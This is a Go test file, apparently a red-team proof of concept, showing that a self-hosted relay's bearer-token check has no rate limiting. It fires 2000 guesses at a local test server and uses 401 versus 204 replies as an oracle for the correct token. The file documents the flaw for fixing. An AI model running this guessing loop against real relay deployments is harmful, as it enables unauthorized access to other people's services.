// Red-team PoC: self-relay bearer-token guessing is unthrottled.
//
// socket.go checks requireToken BEFORE any pre-auth slot accounting
// (internal/signal/socket.go:130-136, probe branch 110-116), so every failed
// guess is a free, unlimited oracle: 401 = wrong, 204 = correct token. There
// is no per-IP failure counter, backoff, or lockout anywhere on the path
// (cmd/relay/main.go serves the mux directly, no middleware).
//
// This test boots the real self-hosted hub and drives 2000 wrong guesses plus
// one correct guess, printing the observed request rate.
//
// Run:  VANORA_SECURITY_STRICT=1 go test ./red_poc -run TestRedSelfTokenGuessingUnthrottled -v
package red_poc

import (
	"context"
	"fmt"
	"net/http"
	"net/http/httptest"
	"testing"
	"time"

	"vanora-relay/internal/signal"
)

func TestRedSelfTokenGuessingUnthrottled(t *testing.T) {
	ctx, cancel := context.WithTimeout(context.Background(), 30*time.Second)
	defer cancel()

	// Dictionary-shaped but policy-compliant token (32B, no whitespace):
	// cmd/relay/main.go:140-142 selfAccessToken only enforces length
	// 32..512 and rejects embedded whitespace — nothing about entropy.
	token := "vanora-self-relay-token-abc123!!"
	h := signal.NewSelfHosted(token, nil)
	go h.Run(ctx)
	srv := httptest.NewServer(h)
	defer srv.Close()

	probe := func(bearer string) int {
		req, _ := http.NewRequest(http.MethodGet, srv.URL+"/v1/signal?probe=1", nil)
		req.Header.Set("Authorization", "Bearer "+bearer)
		resp, err := http.DefaultClient.Do(req)
		if err != nil {
			t.Fatal(err)
		}
		resp.Body.Close()
		return resp.StatusCode
	}

	const guesses = 2000
	start := time.Now()
	statuses := map[int]int{}
	for i := range guesses {
		guess := fmt.Sprintf("dictionary-word-%d-padding-pad-pad-pad-xx!!", i)
		if len(guess) < 32 {
			t.Fatal("wordlist entries must pass the length policy")
		}
		statuses[probe(guess)]++
	}
	elapsed := time.Since(start)

	if statuses[http.StatusUnauthorized] != guesses {
		t.Fatalf("expected every wrong guess to get a free 401, got %v", statuses)
	}

	// The oracle: correct guess vs wrong guess are perfectly distinguishable.
	if probe(token) != http.StatusNoContent {
		t.Fatal("correct token did not return 204")
	}
	wrongTail := probe("another-wrong-word-padding-pad-pad-pad!!")
	if wrongTail != http.StatusUnauthorized {
		t.Fatal("wrong token did not return 401 after 2000 failures — throttled?")
	}

	t.Fatalf("RED TEAM WIN (token guessing unthrottled): %d wrong guesses in %v "+
		"(%.0f req/s, avg %.2f ms/req) all answered free 401, zero lockout/backoff, "+
		"correct guess still distinguished by 204: statuses=%v",
		guesses, elapsed, float64(guesses)/elapsed.Seconds(),
		float64(elapsed.Milliseconds())/float64(guesses), statuses)
}
